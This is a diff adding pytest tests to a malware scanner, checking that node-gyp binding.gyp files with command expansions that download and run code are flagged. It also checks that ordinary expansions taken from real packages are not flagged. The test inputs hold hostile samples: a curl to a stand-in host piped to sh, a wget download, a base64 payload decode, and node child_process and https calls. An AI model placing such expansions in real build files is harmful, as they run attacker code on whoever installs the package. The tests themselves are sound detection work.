@@ -376,3 +376,78 @@ async def test_malware_scan_includes_setup_py_and_pth(tmp_path: Path) -> None:
     result = await run_malware_scan(str(tmp_path))
     ids = {f.rule_id for f in result.findings}
     assert {"malware-setup-py-install-exec", "malware-pth-code-exec"} <= ids
+
+
+# ── #138 node-gyp build files ──────────────────────────────────────────────────
+
+
+def _gyp(variables: str = "", actions: str = "") -> str:
+    return (
+        "# binding.gyp\n"
+        "{\n"
+        "  'targets': [\n"
+        "    {\n"
+        "      'target_name': 'addon',\n"
+        f"      'variables': {{ {variables} }},\n"
+        f"      'actions': [ {actions} ],\n"
+        "    },\n"
+        "  ],\n"
+        "}\n"
+    )
+
+
+@pytest.mark.parametrize(
+    ("variables", "actions", "what"),
+    [
+        (J("'x': '<!(cu", "rl -s https://x.example/p | sh)',"), "", "downloads and runs code"),
+        (J("'x': '<!(wg", "et -q https://x.example/p -O p)',"), "", "downloads from the network"),
+        (J("'x': '<!(echo aGk= | base", "64 -d)',"), "", "decodes an encoded payload"),
+        (
+            "",
+            "{ 'action_name': 'a', 'inputs': [], 'outputs': ['o'], "
+            "'action': ['node', '-e', \"require('child_process').exec(process.env.P)\"] },",
+            "runs code that spawns processes or uses the network",
+        ),
+        (
+            "'x': '<!(node -e \"require(\\'https\\').get(u)\")',",
+            "",
+            "runs code that spawns processes or uses the network",
+        ),
+    ],
+)
+def test_dangerous_gyp_commands_are_high(variables: str, actions: str, what: str) -> None:
+    findings = sc.gyp_findings(_gyp(variables, actions), "binding.gyp")
+    assert [(f.rule_id, f.severity) for f in findings] == [
+        ("malware-gyp-command-exec", Severity.HIGH)
+    ]
+    assert what in findings[0].title
+
+
+@pytest.mark.parametrize(
+    "variables",
+    [
+        # Real-world expansions from sharp, bcrypt and node-addon-api build files.
+        "'i': '<!@(node -p \"require(\\'node-addon-api\\').include\")',",
+        "'n': '<!(node -p \"process.versions.node.split(\\'.\\')[0]\")',",
+        "'v': '<!(node -p \"process.env.NAPI_VERSION || process.versions.napi\")',",
+        "'l': '<!(node -p \"require(\\'../lib/libvips\\').pkgConfigPath()\")',",
+        "'p': '<!@(pkg-config --cflags vips-cpp)',",
+        "'c': '<!(echo $CC)',",
+    ],
+)
+def test_ordinary_gyp_expansions_are_quiet(variables: str) -> None:
+    assert sc.gyp_findings(_gyp(variables), "binding.gyp") == []
+
+
+def test_gyp_that_is_not_a_plain_literal_falls_back_to_strings() -> None:
+    text = _gyp(J("'x': '<!(cu", "rl -s https://x.example | sh)',")).replace(
+        "{\n", "{ undefined_name,\n", 1
+    )
+    assert [f.rule_id for f in sc.gyp_findings(text, "common.gypi")] == ["malware-gyp-command-exec"]
+
+
+@pytest.mark.asyncio
+async def test_malware_scan_includes_binding_gyp(tmp_path: Path) -> None:
+    (tmp_path / "binding.gyp").write_text(_gyp(J("'x': '<!(cu", "rl -s https://x.example | sh)',")))
+    result = await run_malware_scan(str(tmp_path))
+    assert "malware-gyp-command-exec" in {f.rule_id for f in result.findings}
